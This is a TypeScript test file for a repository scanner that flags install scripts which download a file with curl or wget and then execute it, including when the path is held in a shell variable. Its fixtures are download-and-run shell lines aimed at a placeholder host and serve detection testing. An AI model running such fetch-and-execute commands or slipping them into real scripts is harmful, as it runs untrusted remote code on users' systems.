import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

const enc = (text: string) => new TextEncoder().encode(text);

function categories(text: string): string[] {
  return inspectRepository({
    files: [{ path: "install.sh", bytes: enc(text) }],
  }).findings.map((finding) => finding.category);
}

/**
 * An install script that keeps the destination in a variable and runs the same
 * variable is still the two-step act: the download and the execution name one
 * path, only through `$OUT`. The rule required a literal token, so the whole
 * act went clean while the literal spelling fired.
 */
test("a destination held in a variable links the download to the run", () => {
  for (const text of [
    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\nbash "$OUT"\n',
    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSL -o "$OUT" https://x.example/y.sh\nsh "$OUT"\n',
    "#!/bin/sh\nOUT=/tmp/y.sh\ncurl --output=$OUT https://x.example/y.sh\n. $OUT\n",
    '#!/bin/sh\nBIN=/tmp/b\nwget -qO "$BIN" https://x.example/b\nsh "$BIN"\n',
    // The brace spelling and a `./` prefix still name the same variable.
    `#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "\${OUT}" https://x.example/y.sh\nbash "\${OUT}"\n`,
    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSL -o "$OUT" https://x.example/y.sh\nsh ./$OUT\n',
    `#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\n. "./\${OUT}"\n`,
    `#!/bin/sh\nBIN=/tmp/b\nwget -qO "\${BIN}" https://x.example/b\nsh "./\${BIN}"\n`,
  ])
    expect({ text, categories: categories(text) }).toEqual({
      text,
      categories: expect.arrayContaining(["unsafe-execution"]),
    });
});

test("the literal destination keeps working beside the variable one", () => {
  const text =
    "#!/bin/sh\ncurl -fsSLo /tmp/lit.sh https://x.example/lit.sh\nsh /tmp/lit.sh\n";
  expect(categories(text)).toContain("unsafe-execution");
});

test("a different variable, a bare name and a log flag stay clean", () => {
  for (const text of [
    // Download writes $OUT, the run names $OTHER.
    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\nbash "$OTHER"\n',
    // A bare name searches PATH, not the downloaded path.
    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\nbash OUT\n',
    // `wget -o` names the log, not the download.
    '#!/bin/sh\nLOG=/tmp/log\nwget -o "$LOG" https://x.example/b\nsh "$LOG"\n',
    // The prefix does not rescue a different variable.
    '#!/bin/sh\nOUT=/tmp/y.sh\ncurl -fsSLo "$OUT" https://x.example/y.sh\nbash "./$OTHER"\n',
  ])
    expect({ text, categories: categories(text) }).toEqual({
      text,
      categories: [],
    });
});
